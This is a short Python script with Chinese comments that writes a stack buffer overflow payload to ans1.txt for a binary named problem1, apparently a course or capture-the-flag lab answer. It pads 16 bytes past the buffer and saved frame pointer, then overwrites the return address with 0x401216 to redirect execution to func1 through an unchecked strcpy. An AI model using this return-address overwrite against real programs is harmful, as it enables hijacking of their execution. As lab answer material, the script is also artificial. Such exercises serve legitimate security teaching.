import struct

# 1. 目标函数地址 (func1)
target_addr = 0x401216

# 2. 计算偏移量
# Buffer @ rbp-8, Saved RBP 占 8 字节
# Padding = 8 + 8 = 16
padding_len = 16
padding = b'A' * padding_len

# 3. 将地址打包成 64位 小端序 (Q = unsigned long long, 8 bytes)
# 注意：虽然 strcpy 遇到 \x00 会停，但只要 null 字节在最后面，
# 它会复制完前面的有效字节并加上一个 null 终止符，正好完成覆盖。
target_bytes = struct.pack('<Q', target_addr)

# 4. 拼接 Payload
payload = padding + target_bytes

# 5. 写入文件 ans1.txt
with open("ans1.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated! Length: {len(payload)} bytes")
print("Run with: ./problem1 ans1.txt")